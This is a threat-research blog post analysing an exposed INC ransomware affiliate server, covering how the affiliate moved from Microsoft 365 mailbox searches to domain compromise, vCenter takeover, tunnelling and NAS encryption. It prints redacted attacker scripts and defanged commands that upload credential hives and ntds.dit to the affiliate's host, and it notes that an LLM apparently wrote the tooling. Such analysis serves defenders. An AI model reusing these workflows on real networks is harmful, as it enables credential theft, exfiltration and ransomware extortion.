---
title: "INC Ransomware affiliate targets ESXi & NAS Devices in AD environments"
classes: wide
ribbon: black
header:
  teaser: /assets/images/covers/inc-ransomware.png
description: "Exposed operator tooling shows an INC affiliate using likely LLM-generated scripts to enumerate, pivot, and deploy ransomware against network storage"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Overview

Using the [Hunt.io](https://hunt.io/) platform, Ctrl-Alt-Intel researchers discovered an exposed operator working directory containing evidence of an active ransomware intrusion against a Chinese technology organisation. The collection linked cloud-data theft, Active Directory compromise, internal tunnelling, attacks against storage and virtualisation management planes, and the deployment of an INC encryptor against network-attached storage (NAS).

[![1](/assets/images/inc/1.png){: .align-center .img-border}](/assets/images/inc/1.png)
<p class="figure-caption">Hunt.io</p>

We assess with **high confidence** that the server belongs to an **INC Ransom affiliate**. The exposed open-directory contained multiple INC ransomware binaries, alongside scripts, tooling and exfiltrated victim data that can be directly linked to a recent INC Ransom victim - the Chinese company `v-silicon[.]com`:

[![1](/assets/images/inc/2.png){: .align-center .img-border}](/assets/images/inc/2.png)
<p class="figure-caption">ransomware.live v-silicon.com victim</p>

More than 50 Python scripts wrapped Microsoft Graph, WinRM, VMware, storage, backup, SSH, and Windows administration interfaces into short, single-purpose workflows. We assess that the affiliate leveraged Large Language Model (LLM) to generate a significant amounts of operator tooling that was leveraged in the intrusion.

# Intrusion Summary

From the recovered tooling, scripts, artifacts and exfiltrated data was found on the IP address `213.176.114[.]6`. From this, we assess the INC Ransom affiliate did the following:

* Access the internal network via GlobalProtect VPN
* Access cloud mail and storage using compromised identities.
* Recover network diagrams, administrative guides, asset exports, and credentials.
* Use a Windows server as a WinRM-controlled pivot into Active Directory and management networks.
* Extract the domain database and registry hives, then target virtualisation, backup, and storage platforms.
* Create internal forwards to otherwise unreachable management services.
* Map NAS shares to the pivot and launch the INC Windows encryptor against each drive.

# Enumeration / Discovery

The affiliate began by turning compromised Microsoft 365 access into infrastructure intelligence. Python scripts authenticated to Microsoft Graph, searched mailboxes, OneDrive, and SharePoint, and downloaded files likely to contain network diagrams, VPN information, device inventories, VMware exports, passwords, and recovery procedures.

They were repeatedly refined around networking, firewalls, storage, virtualisation, backup systems, and named members of the victim's IT team. This gave the affiliate a route from a user mailbox to the organisation's administrative plane.

## M365 Targeting

One likely AI-assisted script used the OAuth resource owner password credentials (ROPC) flow to exchange a stolen username and password for a Microsoft Graph token. It then searched the compromised mailbox for operationally useful subjects such as network-circuit relocations, server-room migrations, firewall changes, public IP addresses, VPNs, and internet-service providers.

The excerpt below is condensed from `check_it2.py`. The tenant, application, identity, and credential values have been removed, while the original search pattern is preserved.

```python
import json
import urllib.parse
import urllib.request

def get_token(username, password):
    form = urllib.parse.urlencode({
        "grant_type": "password",
        "client_id": "[REDACTED-CLIENT-ID]",
        "scope": "https://graph.microsoft.com/.default",
        "username": username,
        "password": password,
    }).encode()

    request = urllib.request.Request(
        "https://login.microsoftonline.com/"
        "[REDACTED-TENANT-ID]/oauth2/v2.0/token",
        data=form,
        method="POST",
    )
    return json.loads(urllib.request.urlopen(request).read())[
        "access_token"
    ]

def search_mail(token, query):
    url = (
        "https://graph.microsoft.com/v1.0/me/messages"
        "?$search=" + urllib.parse.quote(query) +
        "&$top=5&$select=subject,from,receivedDateTime,body"
    )
    request = urllib.request.Request(url)
    request.add_header("Authorization", "Bearer " + token)
    return json.loads(urllib.request.urlopen(request).read())

token = get_token("[REDACTED-USER]", "[REDACTED-PASSWORD]")

for query in (
    "network circuit relocation",
    "server room migration",
    "FortiGate",
    "firewall change",
    "new public IP address",
):
    results = search_mail(token, query)
    for message in results.get("value", []):
        print(message.get("subject", ""))
        print(message.get("body", {}).get("content", "")[:800])
```

Recovered spreadsheets and planning documents reference ESXi host moves, NetApp power-down tasks, remote access, backup weakness, firewalls, and SD-WAN/VPN dependencies. By the time the operator moved into WinRM and storage APIs, much of the environment had already been mapped in the victim’s documentation.

After reaching an internal Windows server, another script embedded PowerShell inside a minimal Python WinRM wrapper. The original contained a real host, domain administrator credentials, and victim-specific search terms; these have been removed below.

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
Get-ADForest | Select Name, Domains, GlobalCatalogs, Sites
Get-ADTrust -Filter *
Get-ADDomainController -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADUser -Filter {ServicePrincipalName -like "*"}
Get-ADComputer -Filter {
    Name -like "*nas*" -or
    Name -like "*backup*" -or
    Name -like "*storage*"
}
"""

result = session.run_ps(powershell)
print(result.std_out.decode(errors="ignore"))
```

The resulting discovery covered:

* domains, forests, trusts, domain controllers, administrators, and service accounts;
* routes, internal systems, open services, and Windows shares;
* credential stores, browser data, Windows Vault, DPAPI material, SSH keys, and Group Policy Preferences;
* vCenter and ESXi hosts, NAS devices, NetApp and OceanStor storage, and backup infrastructure;
* Microsoft 365 mail, attachments, OneDrive, and SharePoint content.

# Lateral Movement

A compromised domain administrator account was used over WinRM to control an internal Windows server. 

The recovered scripts used or attempted to use:

* WinRM and embedded PowerShell for remote execution;
* SMB and administrative shares for file access and tool transfer;
* SSH for storage and ESXi administration;
* pyVmomi and VMware APIs for vCenter permissions, snapshots, guest operations, and host access;
* ONTAP and OceanStor management APIs for storage enumeration and modification;
* native Windows tooling, NetExec, Impacket, DSInternals, and volume snapshots for credential theft.

The affiliate exported the Active Directory database together with the `SAM`, `SECURITY`, and `SYSTEM` registry hives. Receiver logs recorded successful uploads of all four artefacts to affiliate-controlled infrastructure. 

The management-plane targeting was unusually broad. Scripts granted a compromised identity the global `Administrator` role in vCenter, attempted to reset appliance and SSO credentials, enabled or checked ESXi remote access, queried backup credentials, and modified NetApp export policies. OceanStor scripts cycled through authentication and enumeration approaches while attempting to avoid or recover from account lockouts.

# vCenter / ESXi Targeting

The recovered VMware scripts show the INC affiliate attempting to move from domain-level access into the virtualisation control plane. Five Python files used `pyVmomi` or vCenter REST APIs to enumerate the environment, change permissions, enable remote access, manipulate snapshots, and explore several routes to resetting vCenter appliance credentials.

This targeting is significant because vCenter access concentrates control over large numbers of virtual machines. An affiliate that can modify global permissions, reach ESXi management services, or run Guest Operations against the vCenter Server Appliance can potentially bypass many controls applied to individual workloads.

## vCenter Permissions and Appliance Changes

`vc_perms.py` connected to vCenter with a compromised domain identity and disabled certificate verification. It located the built-in `Administrator` role, represented internally by role ID `-1`, then attempted to assign that role to the compromised account at the vCenter root folder with inheritance enabled.

```python
from pyVim.connect import SmartConnect
from pyVmomi import vim
import ssl

context = ssl._create_unverified_context()
service_instance = SmartConnect(
    host="[VCENTER-HOST]",
    user="[COMPROMISED-DOMAIN-ACCOUNT]",
    pwd="[REDACTED]",
    sslContext=context,
)

content = service_instance.RetrieveContent()
authorization = content.authorizationManager

permission = vim.AuthorizationManager.Permission()
permission.principal = "[DOMAIN]\\[COMPROMISED-ACCOUNT]"
permission.group = False
permission.roleId = -1       # Built-in Administrator role
permission.propagate = True  # Inherit across the inventory

authorization.SetEntityPermissions(
    entity=content.rootFolder,
    permission=[permission],
)
```

The same script created a vCenter API session and attempted three further changes: resetting the appliance `root` password, enabling SSH, and enabling the appliance shell without an expiry. The password and host have been removed from the excerpt.

```python
import requests

headers = {"vmware-api-session-id": "[REDACTED-SESSION]"}
base_url = "https://[VCENTER-HOST]/rest/appliance"

requests.put(
    base_url + "/local-accounts/root",
    headers=headers,
    json={"config": {"password": "[REDACTED-NEW-PASSWORD]"}},
    verify=False,
)

requests.put(
    base_url + "/access/ssh",
    headers=headers,
    json={"enabled": True},
    verify=False,
)

requests.put(
    base_url + "/access/shell",
    headers=headers,
    json={"enabled": True, "timeout": 0},
    verify=False,
)
```

Other scripts tried to reach the same objective through VMware Guest Operations. `vc_reset.py` located the vCenter Server Appliance as a VM, tested compromised accounts for guest authentication, and prepared commands to reset both the operating-system `root` account and the SSO administrator. `vc_pwreset.py` explored session tickets, SAML authentication, VIX, and the Extension Manager, but retained comments acknowledging that several approaches could not proceed without valid guest credentials.

# Pivoting / C2

The affiliate used the compromised Windows server as a bridge between the external operator host and internal management services. One Python script created multiple Windows `portproxy` rules and opened a matching firewall rule. A companion shell script started attacker-side `socat` listeners.

The following shortened excerpt shows the pattern without preserving addresses or ports:

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
netsh interface portproxy add v4tov4 \
  listenport=[REDACTED] listenaddress=[PIVOT] \
  connectport=443 connectaddress=[INTERNAL-STORAGE]

netsh advfirewall firewall add rule \
  name="TunnelPorts" dir=in action=allow \
  protocol=tcp localport=[REDACTED]
"""

session.run_ps(powershell)
```

Separate scripts staged an HTTP receiver on affiliate infrastructure and pushed the domain database and registry hives to it. The corresponding log recorded successful HTTP responses for each upload. The collection also contained evidence of a live VPN session using compromised credentials, showing that the affiliate retained an additional route into the environment while the working directory was exposed.

# Ransomware Deployment

The affiliate did not need to execute native code on the NAS appliance in order to encrypt its data. Instead, `nas_locker.py` mapped five SMB shares to drive letters on the compromised Windows pivot and launched the Windows INC encryptor against those mapped drives.

## NAS Targeting and Validation

The NAS was not selected blindly. A companion script, `nas_check.py`, paused before connecting to the pivot, checked whether `locker.exe` was running, mapped selected NAS shares, listed their root directories, and then removed the mappings. This gave the affiliate a quick way to validate access and inspect the target before or after the ransomware task ran.

```python
import time
import winrm

time.sleep(15)
session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
tasklist /fi "imagename eq locker.exe"

net use K: \\[NAS]\[SHARE-A] \
  /user:[DOMAIN-ADMIN] [REDACTED]
net use N: \\[NAS]\[SHARE-B] \
  /user:[DOMAIN-ADMIN] [REDACTED]

Write-Output "=== SHARE A ==="
cmd /c "dir K:\ /b" | Select-Object -First 10

Write-Output "=== SHARE B ==="
cmd /c "dir N:\ /b" | Select-Object -First 10

net use * /delete /yes
"""

result = session.run_ps(powershell)
print(result.std_out.decode(errors="ignore"))
```

Read beside `nas_locker.py`, this creates a clear operator loop: check the encryptor, confirm that the shares can be mounted, inspect a sample of their contents, launch the scheduled ransomware task, and return to process and directory checks. It is another example of narrow Python wrappers being used to turn an immediate operational question into executable code.

The script wrote a batch file to `C:\Windows\Temp\go.bat`, created a scheduled task named `WinUpdate` at the highest privilege level, ran the task, waited, and queried the process list for `locker.exe`. The deployment logic is shown below with all victim-specific values removed and the five-share loop reduced to one example:

```python
import winrm

session = winrm.Session(
    "[PIVOT-HOST]",
    auth=("[DOMAIN-ADMIN]", "[REDACTED]"),
    transport="ntlm",
)

powershell = r"""
$batch = @'
@echo off
net use K: \\[NAS]\[SHARE] /user:[DOMAIN-ADMIN] [REDACTED]
start "share-k" /min C:\Windows\Temp\locker.exe \
  --mode fast --dir K:\
'@

Set-Content C:\Windows\Temp\go.bat $batch -Encoding ASCII
schtasks /create /tn "WinUpdate" \
  /tr "C:\Windows\Temp\go.bat" /sc once \
  /ru "[DOMAIN-ADMIN]" /rp "[REDACTED]" /rl highest /f
schtasks /run /tn "WinUpdate"
tasklist /fi "imagename eq locker.exe"
"""

session.run_ps(powershell)
```

The executable's interface matches the recovered INC sample: `fast`, `medium`, and `slow` modes, plus a directory argument. The Windows binary was written in Rust and contained functionality for recursive local and network-share encryption, selective fast encryption, process and service termination, shadow-copy removal, and exclusions for selected system and security-software paths. The same archive included payloads for Linux, ESXi, and numerous processor architectures, demonstrating that the affiliate had access to a broader cross-platform impact kit.

# Assessing the Use of AI

We assess with **high confidence** that the INC affiliate used an LLM to create and modify much of the Python-based operational tooling.

Several scripts preserve a running conversation with the code. Comments propose an approach, reject it, and announce the next attempt in language that reads like retained assistant reasoning rather than normal documentation.

```python
# Try SSH to NetApp from [the pivot] using plink alternative
# Actually use System.Net.Sockets to send SSH auth manually? No, too complex.
# Let's try HTTPS API on NetApp instead (ONTAP REST API)

# Best approach: Use vCenter's extensionManager to get a ticket
# Actually - let's check if we can use the administrator SSO token
# Last resort - reset via VIX/GuestOps with InteractiveSession
# The nuclear option: We have full vCenter admin
```

These comments matter because they mirror the actual file sequence. Scripts with names containing `auth`, `try2`, `open`, `fix`, `final`, and `super` show the LLM iterating through API paths, authentication formats, and privilege changes as earlier approaches failed.

# Conclusion

The exposed directory shows an INC affiliate using LLM-generated scripts to connect stolen credentials, Active Directory compromise, vCenter/ESXi targeting, internal tunnelling, and NAS encryption. The best opportunity to stop this activity is before `locker.exe` runs: detect abnormal cloud authentication, WinRM, management-plane changes, and internal proxies.

# IOCs

## Network Indicators

| Indicator | Role | Confidence |
|---|---|---:|
| `213.176.114[.]6` | Affiliate-controlled C2/staging server; open directory on TCP/8888 and confirmed HTTP PUT exfiltration receiver on TCP/7777 | High |
| `incblog6qu4y4mm4zvw5nrmue6qbwtgjsxpw6b7ixzssu36tsajldoad[.]onion` | INC data-leak site embedded in the payloads | High |
| `incblog[.]su` | INC clearnet leak-site address embedded in the payloads | High |

## Host, Task, and Service Artefacts

| Artefact | Type | Context |
|---|---|---|
| `C:\Windows\Temp\locker.exe` | File | Windows INC encryptor staged under the deployment name |
| `l.exe` | File | Name of the recovered Windows INC encryptor on affiliate infrastructure |
| `C:\Windows\Temp\go.bat` | File | Batch file used to map shares and launch the encryptor |
| `INC-README.txt` | File | Ransom note created by the INC payload |
| `.INC` | Extension | Encrypted-file extension/marker; validate with local telemetry |
| `C:\Users\Public\mimi.exe` | File | Mimikatz path explicitly checked by the affiliate's credential-harvesting script |
| `WinUpdate` | Scheduled task | Highest-privilege task used to launch `go.bat` |
| `TunnelPorts` | Windows Firewall rule | Allowed inbound access to the affiliate's port-proxy listeners |
| `HTTP9999` | Windows Firewall rule | Opened TCP/9999 for temporary HTTP access to staged files |
| `TSM-SSH` | ESXi service | Started through `pyVmomi` to enable direct ESXi SSH access |
| `pw-reset-temp` | vCenter snapshot | Snapshot name used by the attempted vCenter password-reset workflow |

Recovered ransomware binary/member names included:

```text
l.exe
locker.exe
x86_64-pc-windows-gnu
x86_64-unknown-linux-esxi
x86_64-unknown-linux-gnu
x86_64-unknown-linux-musl
aarch64-unknown-linux-gnu
arm-unknown-linux-gnueabi
arm-unknown-linux-gnueabihf
armv7-unknown-linux-gnueabi
armv7-unknown-linux-gnueabihf
powerpc-unknown-linux-gnu
powerpc64-unknown-linux-gnu
riscv64gc-unknown-linux-gnu
s390x-unknown-linux-gnu
sparc64-unknown-linux-gnu
```

## Command-Line and PowerShell Patterns

The following patterns have been defanged and stripped of victim-specific values:

```text
C:\Windows\Temp\locker.exe --mode fast --dir <drive>:\

schtasks /create /tn "WinUpdate" /tr "C:\Windows\Temp\go.bat" /sc once /st 00:00 /ru <account> /rp <password> /rl highest /f
schtasks /run /tn "WinUpdate"
schtasks /delete /tn "WinUpdate" /f

tasklist /fi "imagename eq locker.exe"

net use <drive>: \\<nas-host>\<share> /user:<account> <password>
net use * /delete /yes

netsh interface portproxy add v4tov4 listenport=<port> listenaddress=0.0.0.0 connectport=<port> connectaddress=<internal-host>
netsh interface portproxy show all

netsh advfirewall firewall add rule name="TunnelPorts" dir=in action=allow protocol=tcp localport=<ports>
netsh advfirewall firewall add rule name="HTTP9999" dir=in action=allow protocol=tcp localport=9999

Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SAM" -Method PUT -InFile "C:\Windows\Temp\SAM"
Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SECURITY" -Method PUT -InFile "C:\Windows\Temp\SECURITY"
Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/SYSTEM" -Method PUT -InFile "C:\Windows\Temp\SYSTEM"
Invoke-WebRequest -Uri "hxxp://213.176.114[.]6:7777/ntds.dit" -Method PUT -InFile "C:\Windows\Temp\ntds.dit"
```

## File Hashes

| Artefact | SHA-256 |
|---|---|
| Windows INC encryptor recovered as `l.exe` | `ef394149c8da3af730c37d550027df8639a3aaa6feaccea60112461ae6955829` |
| Multi-platform INC payload archive (original name withheld) | `0206a670243efa0f736e3725c4c7c8879b262cb07af47a8dcfa18bc9787cc1bd` |
| `aarch64-unknown-linux-gnu` | `034ac761c0a2baf754f9cc200824ab29fe7124402469d38afc3c5422567d17c8` |
| `arm-unknown-linux-gnueabi` | `3ac3fa5f39372c2dd2822ee63f38852f6ec34a74bdbc46e34a142f8033ccb969` |
| `arm-unknown-linux-gnueabihf` | `7dc832f876ace2d6b763f7c19f29a206dd74a5265a76dc9009fde9e8c0846656` |
| `armv7-unknown-linux-gnueabi` | `db29c0b4d16a4f02bb1631a2eca6e589e13fb6470f20453a393604954b53562e` |
| `armv7-unknown-linux-gnueabihf` | `b3ec3e4e7ab1cae84d9c4cdd63425318588e5d94c2dd720387842969b3bb8507` |
| `powerpc-unknown-linux-gnu` | `5341a686d27b38b7ee580febddcd5817aeef5f94815ff291e508ecaf78cb1070` |
| `powerpc64-unknown-linux-gnu` | `4aaa4cc22addcf3bb54c5ffa16bd2be4b0b0b0437edb29b844b496abc64b9eec` |
| `riscv64gc-unknown-linux-gnu` | `4e83e8236ad7ef73ba0197ffe72b595c29e3ce5efd5c6c98c7663ad55e1646d0` |
| `s390x-unknown-linux-gnu` | `e9ccbb0df3f01ed4a94f7677c802a032edfe8d23c5769522482f94016c81b507` |
| `sparc64-unknown-linux-gnu` | `7477da223bbb0752653f32e60c05eb5c03daf3a5afe89d6565958525a274e211` |
| `x86_64-unknown-linux-esxi` | `753207ad5e72ddc6b13889132e5de18836b1a2acf954443655fea82b430e4c99` |
| `x86_64-unknown-linux-gnu` | `c616e11a2ce7feb3207c1808714d056c9c216f429ad6b840e781f3494ac8485d` |
| `x86_64-unknown-linux-musl` | `126597ea3130600a83ba2ced62e70abb985fcd401ab70525650bb9a1354ca955` |

# MITRE ATT&CK

| Tactic | ID | Technique | Observed use |
|---|---|---|---|
| Initial Access / Persistence | T1078 | Valid Accounts | Compromised cloud, VPN, domain, storage, and virtualisation credentials |
| Execution | T1059.001 / T1059.003 | PowerShell / Windows Command Shell | PowerShell embedded in Python and batch-based ransomware launch |
| Persistence / Execution | T1053.005 | Scheduled Task/Job | `WinUpdate` launched the NAS encryption batch file |
| Credential Access | T1003.002 / .003 / .006 | OS Credential Dumping | Registry hives, NTDS, DCSync, and pass-the-hash workflows |
| Persistence / Privilege Escalation | T1098 | Account Manipulation | Attempted assignment of vCenter's built-in Administrator role to a compromised domain identity |
| Discovery | T1087.002 / T1482 | Domain Account / Trust Discovery | Domain users, administrators, forests, and trusts enumerated |
| Discovery | T1018 / T1046 / T1135 | Remote System, Network Service, and Share Discovery | Internal systems, management interfaces, storage, and shares enumerated |
| Lateral Movement | T1021.002 / .004 / .006 | SMB, SSH, and WinRM | Legitimate remote services used with compromised credentials |
| Command and Control | T1090.001 / T1572 | Internal Proxy / Protocol Tunnelling | Windows port proxies paired with attacker-side listeners |
| Defence Evasion | T1562.004 | Impair Defences: Disable or Modify System Firewall | Firewall rules opened to expose internal services |
| Collection | T1114.002 / T1530 | Email and Cloud Storage Collection | Microsoft Graph used to search and download mail and cloud files |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Identity databases and registry hives uploaded to affiliate infrastructure |
| Impact | T1486 | Data Encrypted for Impact | INC encryptor launched against five mapped NAS shares |
| Impact | T1490 / T1489 | Inhibit System Recovery / Service Stop | Capabilities present in the recovered INC payload |
